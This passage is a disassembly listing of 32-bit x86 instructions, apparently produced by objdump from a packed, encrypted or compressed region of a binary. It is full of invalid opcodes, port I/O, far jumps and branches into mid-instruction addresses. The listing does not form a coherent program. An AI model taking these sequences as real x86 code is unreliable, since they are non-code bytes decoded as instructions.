  41721d:	mov    cl,0x53
  41721f:	adc    al,0xd7
  417221:	nop
  417222:	in     eax,0x1a
  417224:	or     dl,BYTE PTR [ecx+0x33d66e05]
  41722a:	sbb    eax,0xb6ea32b1
  41722f:	or     DWORD PTR [eax+edi*4-0x3f],0xffffffad
  417234:	add    bh,BYTE PTR [esi+eiz*4-0x7]
  417238:	fidiv  DWORD PTR [ebx]
  41723a:	outs   dx,DWORD PTR ds:[esi]
  41723b:	dec    BYTE PTR [ebx]
  41723d:	xchg   ebx,eax
  41723e:	sub    DWORD PTR [esi-0x4043cb3c],0xffffffc9
  417245:	test   al,0xa5
  417247:	ja     0x4172b1
  417249:	mov    ds:0xb91bff09,eax
  41724e:	outs   dx,BYTE PTR ds:[esi]
  41724f:	aad    0x69
  417251:	jl     0xc025a1bd
  417257:	sbb    edx,DWORD PTR [edi+0x3a]
  41725a:	xchg   ebx,eax
  41725b:	jge    0x41725a
  41725d:	in     eax,dx
  41725e:	imul   esp,DWORD PTR [esp+eiz*2+0x6681fd9e],0x21
  417266:	sub    DWORD PTR [ebp-0x5f],esi
  417269:	daa    
  41726a:	setb   BYTE PTR [ecx+edi*1+0x762c060c]
  417272:	addr16 in eax,dx
  417274:	mov    esi,0x72660403
  417279:	adc    BYTE PTR [edi],bh
  41727b:	sub    DWORD PTR [edx+0xd],ecx
  41727e:	ss addr16 inc ebx
  417281:	jne    0x417239
  417283:	push   cs
  417284:	cmp    esp,DWORD PTR [edi]
  417286:	in     al,0xa8
  417288:	adc    al,0xe2
  41728a:	or     al,0x5a
  41728c:	aam    0xc1
  41728e:	xlat   BYTE PTR ds:[ebx]
  41728f:	inc    edx
  417290:	(bad)  
  417292:	sbb    bh,BYTE PTR [edx-0x59e7322d]
  417298:	dec    ebp
  417299:	ret    0xe3a
  41729c:	inc    esi
  41729d:	jmp    0x4172c1
  41729f:	xchg   ebp,eax
  4172a0:	cs (bad) 
  4172a2:	pop    ds
  4172a3:	inc    ecx
  4172a4:	xchg   edi,eax
  4172a5:	xchg   ebp,eax
  4172a6:	and    eax,0xb2165c0a
  4172ab:	push   ss
  4172ac:	hlt    
  4172ad:	out    0x8b,eax
  4172af:	(bad)  
  4172b0:	adc    DWORD PTR [ebx],ebx
  4172b2:	out    0x1,eax
  4172b4:	(bad)  
  4172b5:	das    
  4172b6:	cmp    bh,dh
  4172b8:	mov    BYTE PTR [ecx+ebp*4-0x4f],cl
  4172bc:	inc    eax
  4172bd:	imul   eax,DWORD PTR [ecx-0x733152dd],0xffffff9c
  4172c4:	les    edx,FWORD PTR [eiz*8-0x4ed4f42f]
  4172cb:	inc    ecx
  4172cc:	adc    eax,0x51821cb5
  4172d1:	xor    al,BYTE PTR [edi+0x95cd6fa]
  4172d7:	stos   DWORD PTR es:[edi],eax
  4172d8:	fst    QWORD PTR [edi]
  4172da:	xor    eax,DWORD PTR ds:0xe6662196
  4172e0:	adc    edi,DWORD PTR [ebx]
  4172e2:	mov    cl,0x72
  4172e4:	lock add al,BYTE PTR [ebx]
  4172e7:	mov    WORD PTR [ebp-0xdf65a8c],ds
  4172ed:	(bad)  
  4172ee:	cs clc 
  4172f0:	retf   0xf6db
  4172f3:	gs loop 0x41730f
  4172f6:	fninit 
  4172f8:	mov    ah,0x6a
  4172fa:	(bad)  
  4172fb:	les    esi,FWORD PTR [ebp+edi*2-0x16]
  4172ff:	(bad)  
  417302:	test   DWORD PTR [esi-0x52],0x6b38c86c
  417309:	adc    eax,DWORD PTR [ecx+0x18de0c3f]
  41730f:	rcr    BYTE PTR [esi],0x6c
  417312:	push   ss
  417313:	fmul   st(2),st
  417315:	inc    edx
  417316:	daa    
  417317:	mov    ds:0x56c8f761,eax
  41731c:	adc    eax,0xf7b1cc1d
  417321:	(bad)  
  417322:	mov    esi,0x4396e546
  417327:	rcl    al,cl
  417329:	sbb    cl,BYTE PTR [ebp+0x57]
  41732c:	jb     0x41736e
  41732e:	pop    esp
  41732f:	ficom  WORD PTR [edx]
  417331:	xchg   ebp,eax
  417332:	xchg   DWORD PTR [eax-0x1f],edi
  417335:	mov    edx,0xba3c14bd
  41733a:	out    0xd,eax
  41733c:	sbb    edi,DWORD PTR [eax]
  41733e:	mov    ecx,0x440f7161
  417343:	fwait
  417344:	cdq    
  417345:	push   ecx
  417346:	pop    edx
  417347:	xor    al,0xf
  417349:	add    bh,BYTE PTR [esi-0x5824a1a6]
  41734f:	les    eax,FWORD PTR [esi-0x4a792623]
  417355:	xor    DWORD PTR [edi-0x58],eax
  417358:	shl    DWORD PTR [ebp-0x7cd907a9],0x8
  41735f:	xchg   BYTE PTR [esi-0x680bc12f],bh
  417365:	or     al,BYTE PTR ds:0xc7e248a9
  41736b:	cwde   
  41736c:	mov    edi,0xdfeb9415
  417371:	ret    
  417372:	xor    esp,DWORD PTR [edi+0x570e6563]
  417378:	outs   dx,BYTE PTR ds:[esi]
  417379:	add    ch,al
  41737b:	mov    bl,0x91
  41737d:	fucomi st,st(4)
  41737f:	iret   
  417380:	cdq    
  417381:	adc    esi,edx
  417383:	jbe    0x417319
  417385:	out    dx,al
  417386:	cmp    dl,BYTE PTR [esi+edx*1+0x9f8dca0]
  41738d:	dec    eax
  41738e:	mov    edi,0xc35564db
  417393:	adc    dh,BYTE PTR [esi+0x2b]
  417396:	jne    0x4173d4
  417398:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417399:	leave  
  41739a:	into   
  41739b:	add    BYTE PTR [esi-0x2c1bd6a1],dl
  4173a1:	in     eax,0xaf
  4173a3:	retf   
  4173a4:	je     0x41739c
  4173a6:	aas    
  4173a7:	cs std 
  4173a9:	pop    ebx
  4173aa:	es jne 0x41734c
  4173ad:	shl    BYTE PTR [edi],0x93
  4173b0:	mov    bl,0xfd
  4173b2:	scas   eax,DWORD PTR es:[edi]
  4173b3:	pushf  
  4173b4:	pop    edx
  4173b5:	jo     0x41742f
  4173b7:	scas   eax,DWORD PTR es:[edi]
  4173b8:	pop    es
  4173b9:	aaa    
  4173ba:	mov    ebp,0x2ca87087
  4173bf:	fadd   DWORD PTR [edi+ebp*8-0x48b977a5]
  4173c6:	pop    esp
  4173c7:	add    dl,cl
  4173c9:	daa    
  4173ca:	push   esp
  4173cb:	imul   edx,DWORD PTR [ebx-0x7],0x74f4ce9c
  4173d2:	(bad)  
  4173d3:	jle    0x41738f
  4173d5:	push   ss
  4173d6:	adc    edi,edx
  4173d8:	repz popf 
  4173da:	in     eax,dx
  4173db:	inc    esi
  4173dc:	push   edi
  4173dd:	adc    esp,DWORD PTR [edi]
  4173df:	sbb    BYTE PTR [edx-0x63],ch
  4173e2:	inc    edx
  4173e3:	mov    cl,0x8
  4173e5:	sub    eax,ebx
  4173e7:	pop    ebp
  4173e8:	mov    esi,0xc9e2864
  4173ed:	dec    edx
  4173ee:	mov    BYTE PTR [esi+0x44],bl
  4173f1:	dec    ebx
  4173f2:	inc    eax
  4173f3:	add    ebp,DWORD PTR [ebx+0x407021d4]
  4173f9:	cmp    dl,BYTE PTR [esi+0xe]
  4173fc:	scas   al,BYTE PTR es:[edi]
  4173fd:	mov    ds:0x96c229d,al
  417402:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417403:	mov    cl,0xfd
  417405:	cmp    DWORD PTR [edx+esi*1],edx
  417408:	sahf   
  417409:	sbb    DWORD PTR [edi+0x310ae5db],edi
  41740f:	push   cs
  417410:	stos   BYTE PTR es:[edi],al
  417411:	mov    bh,0x40
  417413:	test   DWORD PTR [edx+esi*2-0x19fd788d],edi
  41741a:	dec    edx
  41741b:	call   0xc1714f1e
  417420:	add    cl,bh
  417422:	cdq    
  417423:	jb     0x417456
  417425:	jns    0x41740e
  417427:	pop    ebp
  417428:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417429:	in     al,dx
  41742a:	cdq    
  41742b:	mov    gs,ecx
  41742d:	or     ebx,eax
  41742f:	out    0xa9,al
  417431:	pop    edx
  417432:	pop    edx
  417433:	nop
  417434:	cwde   
  417435:	rcl    DWORD PTR [edx+0x2a],0x22
  417439:	cs mov dh,0xa1
  41743c:	jmp    0xb0b7ec65
  417441:	xchg   ecx,eax
  417442:	dec    ecx
  417443:	jae    0x41749b
  417445:	stos   DWORD PTR es:[edi],eax
  417446:	aaa    
  417447:	rol    DWORD PTR [eax],0x3f
  41744a:	shl    ecx,cl
  41744c:	out    0x2d,al
  41744e:	out    dx,eax
  41744f:	jle    0x4174a1
  417451:	xchg   ebp,eax
  417452:	or     DWORD PTR ss:[eax],esi
  417455:	or     BYTE PTR [esi],dl
  417457:	mov    ds:0x53296f12,al
  41745c:	push   edi
  41745d:	in     eax,dx
  41745e:	call   0x77f3:0x582cd880
  417465:	dec    edx
  417466:	(bad)  
  417467:	rcr    esi,1
  417469:	retf   
  41746a:	jb     0x4174d2
  41746c:	nop
  41746d:	mov    cl,0xf1
  41746f:	xchg   esi,eax
  417470:	add    ch,BYTE PTR [edi-0x5bf6381c]
  417476:	and    al,0x37
  417479:	ret    
  41747a:	in     eax,0x15
  41747c:	push   ebx
  41747d:	out    dx,eax
  41747e:	sbb    bh,BYTE PTR [ebp+0x51]
  417481:	das    
  417482:	xchg   ebp,eax
  417483:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417484:	inc    eax
  417485:	test   DWORD PTR [esi+eax*2-0x6e70478a],0xddd4801a
  417490:	daa    
  417491:	pushf  
  417492:	mul    DWORD PTR [ecx+0x10]
  417495:	and    eax,0x63654979
  41749a:	add    ch,cl
  41749c:	les    esp,FWORD PTR [edx+0x7d832021]
  4174a2:	or     al,0xcd
  4174a4:	cmp    BYTE PTR [eax+0x46],dl
  4174a7:	repnz test al,0xcf
  4174aa:	lods   eax,DWORD PTR ds:[esi]
  4174ab:	mov    ah,0x86
  4174ad:	push   0x5d639d7b
  4174b2:	mov    cl,BYTE PTR [edx+0x58c35a9e]
  4174b8:	in     al,dx
  4174b9:	jo     0x41746c
  4174bb:	mov    bh,BYTE PTR ds:0x5d1c05d1
  4174c2:	cmp    bh,BYTE PTR [eax+0x1e]
  4174c5:	xchg   esi,eax
  4174c6:	xor    al,0xa6
  4174c8:	leave  
  4174c9:	in     eax,0xa7
  4174cb:	adc    eax,0x39ce7c4e
  4174d0:	mov    ch,0x98
  4174d2:	cmp    edi,DWORD PTR [ebp+eax*2+0x26048887]
  4174d9:	not    DWORD PTR [ebp+0xd]
  4174dc:	xor    al,0x6d
  4174de:	outs   dx,DWORD PTR ds:[esi]
  4174df:	xor    ebx,esp
  4174e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4174e2:	pushf  
  4174e3:	not    BYTE PTR [ecx-0x70dc7f9b]
  4174e9:	fist   DWORD PTR ss:[edi-0x21]
  4174ed:	jmp    0x853a5df6
  4174f2:	fild   WORD PTR [eax]
  4174f4:	fild   WORD PTR [ecx+ecx*1+0x7e3883d0]
  4174fb:	shr    DWORD PTR [ecx],cl
  4174fd:	adc    DWORD PTR [ebx-0xf39a004],eax
  417503:	clc    
  417504:	fsubr  st(0),st
  417506:	stos   DWORD PTR es:[edi],eax
  417507:	mov    cl,0x59
  417509:	xor    esp,eax
  41750b:	and    ebp,DWORD PTR [esi]
  41750d:	aad    0x5c
  41750f:	mov    esp,0xe1ccf154
  417514:	pushf  
  417515:	fadd   st(0),st
  417517:	mov    edx,0x6cb6a05d
  41751c:	push   ss
  41751d:	jmpw   0x168e
  417521:	push   ss
  417522:	sub    BYTE PTR [ecx],ah
  417524:	rcr    DWORD PTR [ecx],1
  417526:	cli    
  417527:	or     BYTE PTR [ecx+0x647e8462],0x28
  41752e:	mov    esi,0xd5bb24e7
  417533:	inc    eax
  417534:	ins    DWORD PTR es:[edi],dx
  417535:	pushf  
  417536:	pushf  
  417537:	add    bl,BYTE PTR [esi-0x477faed4]
  41753d:	sbb    DWORD PTR [esi+0x48],edx
  417540:	and    eax,0x14fadaea
  417545:	xchg   edi,eax
  417546:	in     eax,0xe8
  417548:	dec    edi
  417549:	aaa    
  41754a:	inc    ebp
  41754b:	mov    ebp,0x385ce7a4
  417550:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417551:	daa    
  417552:	fs popf 
  417554:	or     dh,BYTE PTR ds:0xd99c4b4e
  41755a:	adc    dh,ch
  41755c:	sbb    bl,BYTE PTR [eax]
  41755e:	jmp    0x41757d
  417560:	stos   DWORD PTR es:[edi],eax
  417561:	xchg   DWORD PTR [edi+0x32],ebx
  417564:	sbb    al,0x81
  417566:	push   ss
  417567:	mov    al,BYTE PTR [edx+ebp*8+0x75dfa394]
  41756e:	add    BYTE PTR [edi-0x21],dh
  417571:	pushf  
  417572:	inc    esi
  417573:	jmp    0x417525
  417575:	mov    WORD PTR [edx],?
  417577:	inc    esp
  417578:	rol    DWORD PTR [eax+0x54],0x61
  41757c:	arpl   WORD PTR [esi+0x4d],cx
  41757f:	jl     0x417527
  417581:	mov    ds:0x70091ef,eax
  417586:	pop    ds
  417587:	mov    dh,0x11
  417589:	and    eax,0x19bb3b0f
  41758e:	or     al,0xb0
  417590:	add    DWORD PTR [edx+ebp*1],edx
  417593:	jnp    0x4175d9
  417595:	stos   DWORD PTR es:[edi],eax
  417596:	adc    dl,cl
  417598:	test   BYTE PTR [edx+0x37],cl
  41759b:	dec    ebp
  41759c:	nop
  41759d:	jl     0x4175f6
  41759f:	xor    eax,0x9276cac7
  4175a4:	jle    0x4175dd
  4175a6:	dec    edx
  4175a7:	dec    ebp
  4175a8:	aad    0x34
  4175aa:	aaa    
  4175ab:	test   eax,0x21227b3c
  4175b0:	fwait
  4175b1:	lods   eax,DWORD PTR ds:[esi]
  4175b2:	std    
  4175b3:	or     al,0x3f
  4175b5:	push   edi
  4175b6:	mov    al,ds:0xdbbc40ab
  4175bb:	mov    al,ds:0x61c5c172
  4175c0:	sar    BYTE PTR ds:0xed5fc985,0xd1
  4175c7:	mov    ecx,0xf363b856
  4175cc:	fwait
  4175cd:	es ins DWORD PTR es:[edi],dx
  4175cf:	jl     0x417571
  4175d1:	mov    ch,0x8f
  4175d3:	loope  0x417638
  4175d5:	xlat   BYTE PTR ds:[ebx]
  4175d6:	xor    cl,BYTE PTR [eax]
  4175d8:	loope  0x4175e1
  4175da:	xor    bh,BYTE PTR [esi]
  4175dc:	jl     0x417643
  4175de:	shl    edi,0x4b
  4175e1:	pop    edi
  4175e2:	jnp    0x41763e
  4175e4:	push   ebx
  4175e5:	sub    al,0xd3
  4175e7:	jecxz  0x4175c5
  4175e9:	clc    
  4175ea:	pop    esi
  4175eb:	and    al,0xcf
  4175ed:	or     eax,0xea99a9ff
  4175f2:	mov    esi,0x5fde6799
  4175f7:	sub    cl,BYTE PTR [ebp+0x2d0f40d6]
  4175fd:	arpl   WORD PTR [esi],cx
  4175ff:	or     eax,0xd094bebf
  417604:	pop    ebx
  417605:	push   ebx
  417606:	dec    esi
  417607:	fidivr WORD PTR [edx+0x1d75351f]
  41760d:	pop    esp
  41760e:	mov    edx,0x8a268ee8
  417613:	push   edx
  417615:	push   ebx
  417616:	or     eax,0x72b57f6e
  41761b:	sub    ecx,DWORD PTR [esi]
  41761d:	fcom   DWORD PTR [edi+0x12]
  417620:	or     al,0x5e
  417622:	pop    ecx
  417623:	ret    0x7dc0
  417626:	jns    0x417611
  417628:	fiadd  DWORD PTR [edi+ecx*8]
  41762b:	cmp    DWORD PTR ds:[edx],eax
  41762e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41762f:	cs pusha 
  417631:	adc    dl,BYTE PTR [eax]
  417633:	inc    edx
  417634:	mov    ah,ah
  417636:	push   0xfffffffb
  417638:	adc    dl,BYTE PTR [edx]
  41763a:	sub    BYTE PTR [ebx],dh
  41763c:	mov    ds:0x4b434eb3,al
  417641:	in     eax,dx
  417642:	xlat   BYTE PTR ds:[ebx]
  417643:	inc    eax
  417644:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417645:	int3   
  417646:	sbb    eax,0x242ae00
  41764b:	hlt    
  41764c:	scas   al,BYTE PTR es:[edi]
  41764d:	fld    QWORD PTR [esi+0x5618c389]
  417653:	scas   eax,DWORD PTR es:[edi]
  417654:	mov    dl,0xa1
  417656:	jl     0x41765b
  417658:	mov    cl,0x82
  41765a:	pop    ds
  41765b:	xchg   BYTE PTR gs:[esi+0x1c8bd05e],cl
  417662:	gs in  al,0xc8
  417665:	dec    edx
  417666:	in     al,0xf9
  417668:	leave  
  417669:	jae    0x417682
  41766b:	shl    BYTE PTR [edi+ebp*4-0x4c],1
  41766f:	cmp    BYTE PTR [ebp+0x6f16c41c],bl
  417675:	inc    ecx
  417676:	inc    esp
  417677:	shl    DWORD PTR [eax+0x199dc07],cl
  41767d:	xchg   esp,eax
  41767e:	in     al,0x5e
  417680:	jno    0x4176de
  417682:	stc    
  417683:	push   0xffffffaf
  417685:	in     eax,dx
  417686:	out    dx,eax
  417687:	inc    ebx
  417688:	jne    0x4176cb
  41768a:	icebp  
  41768b:	pusha  
  41768c:	xchg   ecx,eax
  41768d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41768e:	jo     0x417665
  417690:	mov    DWORD PTR [edx],eax
  417692:	lods   al,BYTE PTR ds:[esi]
  417693:	ret    
  417694:	pop    ss
  417695:	cmp    bh,bl
  417697:	icebp  
  417698:	push   eax
  417699:	arpl   WORD PTR [eax],si
  41769b:	jg     0x417687
  41769d:	cli    
  41769e:	or     edx,ecx
  4176a0:	inc    ebp
  4176a1:	push   ss
  4176a2:	loopne 0x41762e
  4176a4:	imul   esp,DWORD PTR [ecx],0xffffffe8
  4176a7:	or     dl,dl
  4176a9:	ins    DWORD PTR es:[edi],dx
  4176aa:	int3   
  4176ab:	leave  
  4176ac:	imul   eax,DWORD PTR [ebx],0x16
  4176af:	xor    al,0xf3
  4176b1:	mov    esp,fs
  4176b3:	loopne 0x41764e
  4176b5:	stc    
  4176b6:	mov    cr1,esi
  4176b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4176ba:	xchg   esp,eax
  4176bb:	jno    0x4176ea
  4176bd:	sbb    al,0x1d
  4176bf:	xor    BYTE PTR ds:0xd039182d,bh
  4176c5:	fld    DWORD PTR [ecx]
  4176c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4176c8:	dec    edi
  4176c9:	(bad)  
  4176ca:	call   0xa6c3:0xa3f65009
  4176d1:	sub    al,0x2
  4176d3:	and    BYTE PTR [edi-0x63a2c21b],dh
  4176d9:	call   0xdbd4:0x2cfe168c
  4176e0:	dec    eax
  4176e1:	jmp    0x4176cf
  4176e3:	push   es
  4176e4:	jg     0x417750
  4176e6:	cmp    cl,BYTE PTR [edi-0x67]
  4176e9:	add    BYTE PTR [ebp-0x39],dh
  4176ec:	ja     0x41770d
  4176ee:	xchg   edx,eax
  4176ef:	ss cmp al,0xb1
  4176f2:	std    
  4176f3:	and    eax,0x14aae4e8
  4176f8:	call   0x8f7e913e
  4176fd:	(bad)  
  4176fe:	push   ebx
  4176ff:	mov    bh,0x3b
  417701:	retf   
  417702:	and    ah,BYTE PTR [ebx-0x7d]
  417705:	shl    ebp,0x1e
  417708:	or     esi,edx
  41770a:	mov    esi,es
  41770c:	sbb    edx,esi
  41770e:	jne    0x417702
  417710:	sub    eax,0x6565147b
  417715:	stos   DWORD PTR es:[edi],eax
  417716:	sub    eax,0x553d0bad
  41771b:	aad    0x62
  41771d:	xchg   ebx,eax
  41771e:	repnz add eax,DWORD PTR [edx]
  417721:	clc    
  417722:	ja     0x417781
  417724:	cmp    esp,ebp
  417726:	cdq    
  417727:	outs   dx,BYTE PTR ds:[esi]
  417728:	xchg   ecx,eax
  417729:	xchg   ebp,eax
  41772a:	mov    al,ds:0x897b3dc1
  41772f:	jmp    0x5f269db0
  417734:	cmp    ebp,eax
  417736:	nop
  417737:	sub    al,0x58
  417739:	push   ss
  41773a:	jp     0x4176c9
  41773c:	dec    edx
  41773d:	out    dx,al
  41773e:	aad    0xe2
  417740:	pop    eax
  417741:	mov    eax,0x5c6b48c1
  417746:	mov    eax,DWORD PTR [ecx+0x7974f56f]
  41774c:	pop    ds
  41774d:	call   0x6ed40b9
  417752:	xchg   DWORD PTR [edi-0x4de3998f],eax
  417758:	adc    esi,DWORD PTR [edi+0x5]
  41775b:	enter  0x78ac,0xba
  41775f:	dec    eax
  417760:	pop    eax
  417761:	jmp    0x2c55:0x3ed16e56
  417768:	jns    0x417708
  41776a:	add    al,0x7e
  41776c:	pop    eax
  41776d:	add    BYTE PTR [ecx+ebp*1],al
  417770:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417771:	out    dx,al
  417772:	inc    esp
  417773:	js     0x417780
  417775:	ficom  DWORD PTR [ecx]
  417777:	push   0x20a0b5de
  41777c:	push   cs
  41777d:	inc    eax
  41777e:	call   0xd533:0x8db982f5
  417785:	mov    edi,DWORD PTR gs:[eax-0x60]
  417789:	jle    0x417754
  41778b:	adc    al,BYTE PTR [eax+0x18c1e1c]
  417791:	in     eax,0x3a
  417793:	fld    TBYTE PTR [edx+eax*8+0x73]
  417797:	adc    BYTE PTR [ecx],ah
  417799:	pop    eax
  41779a:	imul   edi,esp,0x3
  41779d:	lea    esi,[esi-0x2]
  4177a0:	xchg   ebp,eax
  4177a1:	aam    0x67
  4177a3:	lahf   
  4177a4:	icebp  
  4177a5:	dec    esp
  4177a6:	mov    ?,WORD PTR [ebp+0x55]
  4177a9:	jp     0x4177be
  4177ab:	mov    dl,0x4c
  4177ad:	push   esi
  4177ae:	mov    dh,0xb6
  4177b0:	or     al,0xd0
  4177b2:	stos   DWORD PTR es:[edi],eax
  4177b3:	(bad)  
  4177b5:	cli    
  4177b6:	mov    eax,0xea997f1a
  4177bb:	cmp    edx,edx
  4177bd:	and    ebp,edi
  4177bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177c0:	mov    al,0x18
  4177c2:	mov    al,ds:0x9e20fd26
  4177c7:	push   cs
  4177c8:	mov    al,ds:0x2d9d360e
  4177cd:	mov    edx,0x3e398e73
  4177d2:	pop    ds
  4177d3:	dec    ebx
  4177d4:	push   cs
  4177d5:	in     al,dx
  4177d6:	lds    edx,FWORD PTR [esi]
  4177d8:	(bad)  
  4177d9:	popa   
  4177da:	mov    ds:0x67322202,al
  4177df:	fld    QWORD PTR [esi+0x6ab0812d]
  4177e5:	das    
  4177e6:	jmp    0x41779a
  4177e8:	out    0x41,al
  4177ea:	mov    ecx,0xd8354440
  4177ef:	or     al,0x50
  4177f1:	and    dh,dl
  4177f3:	xchg   ecx,eax
  4177f4:	jno    0x41783b
  4177f6:	jns    0x4177a5
  4177f8:	stos   DWORD PTR es:[edi],eax
  4177f9:	cmp    al,BYTE PTR [ebx-0x4b591270]
  4177ff:	push   esi
  417800:	shl    eax,0xc0
  417803:	mov    ebx,0x54996f00
  417808:	ss icebp 
  41780a:	add    al,0x7b
  41780c:	and    BYTE PTR [eax+0x519a7770],dl
  417812:	cmp    cl,BYTE PTR [edx]
  417814:	add    DWORD PTR [esi],0x72011748
  41781a:	out    dx,eax
  41781b:	jo     0x41788b
  41781d:	sub    al,0x71
  41781f:	das    
  417820:	xor    dl,BYTE PTR [ecx]
  417822:	leave  
  417823:	add    ah,BYTE PTR [eax+edi*2]
  417826:	scas   eax,DWORD PTR es:[edi]
  417827:	push   0x1e
  417829:	scas   eax,DWORD PTR es:[edi]
  41782a:	fiadd  WORD PTR [ebp-0x7]
  41782d:	push   es
  41782e:	(bad)  
  41782f:	fwait
  417830:	xlat   BYTE PTR ds:[ebx]
  417831:	mov    edi,ebp
  417833:	jl     0x4177b6
  417835:	or     eax,0x2292bb38
  41783a:	daa    
  41783b:	adc    ah,BYTE PTR [edi]
  41783d:	xchg   BYTE PTR cs:[ebx+0x24],dl
  417841:	inc    ebp
  417843:	mov    ebp,0xe77cac51
  417848:	cld    
  417849:	cwde   
  41784a:	or     eax,0xdf4ab457
  41784f:	pop    ebx
  417850:	mov    esp,0x2630e5ca
  417855:	inc    esp
  417856:	sbb    edx,edi
  417858:	jmp    0xb4f7:0xae432466
  41785f:	js     0x4178cb
  417861:	mov    WORD PTR [edx+0x13],gs
  417864:	das    
  417865:	jl     0x41786b
  417867:	jo     0x41781a
  417869:	push   esi
  41786a:	repnz pop ds
  41786c:	sub    BYTE PTR [edx-0x6],ah
  41786f:	arpl   ax,si
  417871:	add    eax,0x32f487e8
  417876:	jmp    0xd80:0xb1e02298
  41787d:	adc    esi,esi
  41787f:	xchg   ecx,eax
  417880:	jb     0x417830
  417882:	and    DWORD PTR [edx],0x18
  417885:	jbe    0x4178d1
  417887:	sbb    BYTE PTR [ecx+0x3379323a],ch
  41788d:	dec    esi
  41788e:	mov    edi,ebp
  417890:	add    bl,BYTE PTR [edx+eiz*4+0x10d2fd97]
  417897:	call   0xf864cc1f
  41789c:	add    al,0xde
  41789e:	test   DWORD PTR [eax+0x6],ebx
  4178a1:	(bad)  
  4178a2:	sbb    edx,edx
  4178a4:	clc    
  4178a5:	mov    bh,0xe
  4178a7:	push   ecx
  4178a8:	or     bh,BYTE PTR [ecx+0x39]
  4178ab:	fdiv   DWORD PTR [eax+0x34]
  4178ae:	jg     0x417866
  4178b0:	jns    0x417913
  4178b2:	add    BYTE PTR [edi],dl
  4178b4:	test   eax,0xea9ca040
  4178b9:	lods   al,BYTE PTR ds:[esi]
  4178ba:	mov    edi,0xa3316ed4
  4178bf:	bound  esp,QWORD PTR [esi]
  4178c1:	jmp    0x7731:0x5bfdd7ed
  4178c8:	ins    DWORD PTR es:[edi],dx
  4178c9:	mov    bh,BYTE PTR [esi-0x4a0eb5d7]
  4178cf:	jp     0x4178bf
  4178d1:	cli    
  4178d2:	mov    dh,0xcf
  4178d4:	outs   dx,BYTE PTR ds:[esi]
  4178d5:	dec    esp
  4178d6:	test   eax,0x349da8a2
  4178db:	xor    al,BYTE PTR [ecx]
  4178dd:	inc    esi
  4178de:	jle    0x4178fc
  4178e0:	pop    eax
  4178e1:	inc    edi
  4178e2:	adc    ch,BYTE PTR [esp+eax*8-0x5a4e5115]
  4178e9:	addr16 jle 0x4178ab
  4178ec:	sbb    al,0x53
  4178ef:	adc    eax,DWORD PTR [ebx+0xc]
  4178f2:	popf   
  4178f3:	adc    BYTE PTR [esi+edx*1+0x48],0x11
  4178f8:	adc    DWORD PTR [edi],eax
  4178fa:	icebp  
  4178fb:	sti    
  4178fc:	ret    0x4e5c
  4178ff:	inc    eax
  417900:	std    
  417901:	in     eax,0xc2
  417903:	xchg   ecx,eax
  417904:	cld    
  417905:	adc    al,0x45
  417907:	mov    BYTE PTR [esi+ebp*4],ch
  41790a:	(bad)  
  41790b:	jmp    0x2c05:0xca063cb5
  417912:	in     al,dx
  417913:	cmp    DWORD PTR [esi-0x54],0x44
  417917:	mov    ecx,fs
  417919:	xchg   ebp,eax
  41791a:	std    
  41791b:	inc    ecx
  41791c:	fld    TBYTE PTR [edx]
  41791e:	scas   al,BYTE PTR es:[edi]
  41791f:	and    bl,cl
  417921:	cmp    al,0xa9
  417923:	mov    ebx,0xd0e684f3
  417928:	iret   
  417929:	dec    ebx
  41792a:	(bad)  
  41792b:	or     dh,BYTE PTR fs:0xbd9fed66
  417932:	fbld   TBYTE PTR [edi]
  417934:	xor    ebp,esp
  417936:	sbb    eax,0x2528dd84
  41793b:	fwait
  41793c:	lods   al,BYTE PTR ds:[esi]
  41793d:	or     DWORD PTR [ebx+0x51],ecx
  417940:	adc    DWORD PTR [ebx+eax*2],eax
  417943:	pop    ecx
  417944:	pop    ebx
  417945:	(bad)  
  417946:	jnp    0x417958
  417948:	xor    BYTE PTR [ebx-0x3264b414],dh
  41794e:	retf   
  41794f:	mov    dh,0xa2
  417951:	mov    al,0x62
  417953:	cmp    DWORD PTR [esi+0x6],edx
  417956:	push   ebp
  417957:	repnz cdq 
  417959:	popf   
  41795a:	mov    edx,DWORD PTR [edi+0x2481f1f5]
  417960:	cs mov ah,0x75
  417963:	into   
  417964:	xchg   ecx,eax
  417965:	je     0x4179d1
  417967:	xchg   esi,eax
  417968:	cmp    BYTE PTR [edx],0x9e
  41796b:	pop    ds
  41796c:	xor    eax,0x33e7907b
  417971:	ss xchg ecx,eax
  417973:	jnp    0x41794e
  417975:	jle    0x417975
  417977:	lea    eax,[edi]
  417979:	std    
  41797a:	pop    ebx
  41797b:	mov    edx,0xab28ff95
  417980:	xor    eax,0x472f62df
  417985:	adc    eax,0x4e02556
  41798a:	dec    eax
  41798b:	xchg   ecx,eax
  41798c:	jae    0x4179af
  41798e:	xchg   BYTE PTR [edx],bh
  417990:	jmp    0x3031c738
  417995:	mov    ds:0xc7570a09,al
  41799a:	mov    ah,0xf0
  41799c:	loope  0x4179d3
  41799e:	fst    QWORD PTR [bx+di-0x75]
  4179a2:	or     DWORD PTR [ecx-0x7],eax
  4179a5:	sub    al,BYTE PTR [ebp+0x769bc666]
  4179ab:	xchg   esi,eax
  4179ac:	inc    esp
  4179ad:	fucom  st(2)
  4179af:	(bad)  
  4179b1:	test   DWORD PTR [edx-0x43],esi
  4179b4:	ds mov ebx,0x82fa1b46
  4179ba:	ret    
  4179bb:	xchg   ecx,eax
  4179bc:	adc    BYTE PTR [eax+0x73cfa0d5],cl
  4179c2:	lods   eax,DWORD PTR ds:[esi]
  4179c3:	mov    esi,0x9014438b
  4179c8:	mov    BYTE PTR [esi-0x29f50daf],cl
  4179ce:	adc    BYTE PTR [edi+0x32f83f38],dl
  4179d4:	addr16 adc ebp,esi
  4179d7:	jne    0x417a1c
  4179d9:	adc    eax,0x8e560ef5
  4179de:	xor    al,0x76
  4179e0:	add    ch,0x33
